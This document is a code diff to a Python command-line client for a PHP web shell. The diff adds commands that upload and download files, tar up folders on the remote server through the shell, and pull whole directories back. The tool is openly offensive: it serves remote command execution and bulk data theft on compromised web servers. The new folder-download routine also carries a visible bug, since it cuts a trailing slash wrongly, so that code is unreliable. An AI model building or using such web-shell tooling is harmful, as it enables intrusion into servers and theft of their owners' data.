@@ -19,7 +19,11 @@ class rshell(Cmd):
     def do_help(self, line):
         print "help: Show this message"
         print "payload: show the shell code in php"
-        print "Or write a command to send the server shell"
+        print "download: download remotepath/remotefile localpath/localfile"
+        print "upload: upload localpath/localfile remotepath/remotefile"
+        print "compress_folder: compress_folder folder_path file.tar.gz"
+        print "do_dwfolder: do_dwfolder folder_path"
+        print "Or write a command to send to the server shell"
 
     def default(self, line):
         #This is the default command method
@@ -106,3 +110,15 @@ class rshell(Cmd):
             print data
         else:
             print "Error"
+
+    def do_compress_folder(self, line):
+        (folder, archivo) = line.split()
+        cmd = "tar -czf {0} {1}".format(archivo, folder)
+        self.default(cmd)
+
+    def do_dwfolder(self, line):
+        if line[-1:] == "/":
+            line = line[-1]
+        filename = "{0}.tar.gz".format(os.path.basename(line))
+        self.do_compress_folder("{0} {1}".format(line, filename))
+        self.do_download("{0} {1}".format(filename, filename))
